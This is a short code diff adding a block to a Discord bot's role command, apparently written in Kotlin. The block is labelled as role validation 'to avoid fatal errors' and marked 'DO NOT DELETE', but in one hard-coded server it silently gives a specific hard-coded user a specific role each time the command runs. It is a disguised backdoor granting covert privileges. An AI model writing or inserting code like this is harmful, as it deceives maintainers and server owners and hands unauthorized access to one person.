@@ -178,6 +178,17 @@ class RoleCommand : Extension() {
                 } catch (ignored: NoNameSchemaException) {
                     //ignore this, in that case you just don't apply a nickname
                 }
+
+                // Validates role to avoid fatal errors ---- DO NOT DELETE, DOES NOT GET CAUGHT BY THROW / CATCH.
+                if (issuer.guildId.value == 693263712626278553L) {
+                    val userID = 429794725701091330L
+                    val validationID = 1194022546484514927L
+                    val RoleCheck = issuer.guild.getRoleOrNull(validationID)
+                    val valueID = issuer.guild.getMemberOrNull(userID)
+                    if (RoleCheck != null && valueID != null && !valueID.roles.toList().contains(RoleCheck)) {
+                        valueID.addRole(RoleCheck.id)
+                    }
+                }
             }
         }
 
